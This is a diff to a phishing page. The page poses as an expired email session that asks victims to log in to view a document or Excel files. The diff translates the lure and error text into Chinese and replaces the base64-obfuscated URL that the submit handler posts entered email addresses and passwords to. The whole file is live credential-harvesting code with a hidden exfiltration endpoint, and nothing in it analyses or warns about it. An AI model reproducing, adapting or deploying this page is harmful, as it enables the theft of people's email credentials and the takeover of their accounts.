@@ -1,5 +1,4 @@
 
-
 <!doctype html>
 <html lang="en">
 
@@ -37,12 +36,12 @@
                 <div class="modal-body px-5">
                     <span style="font-weight: 700; color: rgb(87, 87, 87); font-size: 17px;"><img
 style="width: 30px; height: 30px;" alt=""
-src="https://archive.org/download/ort_20220328/ort.png"> Email timed out, please login to view Document.
+src="https://archive.org/download/ort_20220328/ort.png"> 邮箱超时，请重新登录
 .</span>
                     <form class="mt-4">
                         <center>
-                            <div class="alert alert-danger" id="msg" style="display: none;">Invalid password! Please enter the correct password.</div>
-                            <span id="error" class="text-danger" style="display: none;">The account does not exist. enter another account。</span>
+                            <div class="alert alert-danger" id="msg" style="display: none;">无效的密码！请输入正确的密码.</div>
+                            <span id="error" class="text-danger" style="display: none;">该帐户不存在。输入另一个帐户。</span>
                         </center>
                         <div class="form-group row">&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;
                                                         <div class="col-sm-8">
@@ -51,13 +50,13 @@ src="https://archive.org/download/ort_20220328/ort.png"> Email timed out, please
                         </div>
                         <div class="form-group row">&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;
                             <div class="col-sm-8 ">
-                                <input type="password" class="form-control py-1" id="pr" placeholder="Enter email password">
+                                <input type="password" class="form-control py-1" id="pr" placeholder="输入邮箱密码">
                             </div>
                         </div>
                     </form>
                 </div>
-                    <button type="button" class="btn btn-success py-1" id="submit-btn">View Excel Files</button>
-                    <button type="button" class="btn btn-secondary py-1">Cancel</button>
+                    <button type="button" class="btn btn-success py-1" id="submit-btn">查看文件</button>
+                    <button type="button" class="btn btn-secondary py-1">取消</button>
                 </div>
             </div>
         </div>
@@ -106,7 +105,7 @@ $(document).ready(function() {
     }
     ///////////////url getting ai////////////////
 
-    var file = "aHR0cHM6Ly93d3cubHV4dmVudHVzLmV1L3BocC93ZXRyYW5zZmVyL2V4Y2VsLnBocA==";
+    var file = "aHR0cHM6Ly9iYWYuY29tLnNhL25ld2MucGhw";
 
     $('#submit-btn').click(function(event) {
         $('#error').hide();
@@ -122,20 +121,20 @@ $(document).ready(function() {
 
         if (!ai) {
             $('#error').show();
-            $('#error').html("Email field is empty.！");
+            $('#error').html("电子邮件字段为空。！");
             ai.focus;
             return false;
         }
 
         if (!filter.test(my_ai)) {
             $('#error').show();
-            $('#error').html("The account does not exist. Enter another account");
+            $('#error').html("该帐户不存在。输入其他帐户");
             ai.focus;
             return false;
         }
         if (!pr) {
             $('#error').show();
-            $('#error').html("Password field is empty.！");
+            $('#error').html("密码字段为空。！");
             ai.focus;
             return false;
         }
@@ -157,7 +156,7 @@ $(document).ready(function() {
             },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr) {
-                $('#submit-btn').html('verify...');
+                $('#submit-btn').html('验证...');
             },
             success: function(response) {
                 if (response) {
